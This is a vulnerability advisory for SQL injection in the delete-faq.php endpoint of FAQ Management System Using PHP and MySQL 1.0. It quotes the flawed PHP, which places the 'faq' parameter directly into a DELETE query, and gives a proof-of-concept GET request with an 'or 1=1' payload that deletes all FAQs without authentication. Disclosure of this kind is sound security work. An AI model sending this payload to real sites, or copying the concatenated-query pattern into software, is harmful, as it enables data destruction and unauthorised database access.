## Vulnerability Details

**Credits**: 
> Reigz Macolor (https://github.com/reigz/)<br/>

**Tested On**:
> [FAQ Management System Using PHP and MySQL 1.0](https://www.sourcecodester.com/php/17175/faq-management-system-using-php-and-mysql-source-code.html) <br/>

**Affected Version**:
> FAQ Management System Using PHP and MySQL 1.0

**Affected Site Page**: 
> /faq-management-system/endpoint/delete-faq.php<br/>

**Affected Code**: 
> </delete-faq.php> <br/>

Even if there's an attempt to use prepared statements, the code actually recieves the user input via `faq` parameter and writes into `$query`. 

```php
...
if (isset($_GET['faq'])) {
    $faq = $_GET['faq'];

    try {

        $query = "DELETE FROM tbl_faq WHERE tbl_faq_id = '$faq'";

        $stmt = $conn->prepare($query);

        $query_execute = $stmt->execute();
...
```

**Related CWE:**
> [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)

## **Details:**
> Allows SQL Injection by placing untrusted code executing a query on the backend, for the POC all FAQs are deleted without any authentication

![image](https://github.com/smurf-reigz/security/assets/48426940/9727f7a4-b6ee-4f4b-b570-98dad4f579de)

```http 
GET /faq-management-system/endpoint/delete-faq.php?faq=1337'+or+1=1--+ HTTP/1.1
Host: localhost
Connection: close
```

> DELETES all FAQs without authentication.

![image](https://github.com/smurf-reigz/security/assets/48426940/9f60b7fd-746f-4ddf-88fb-72133a16e6e4)

## **Vulnerability Impact:**
> As an attacker, can do the following:
> 1. Run any database query and have same permission as the web application (default for this Web Application is root).
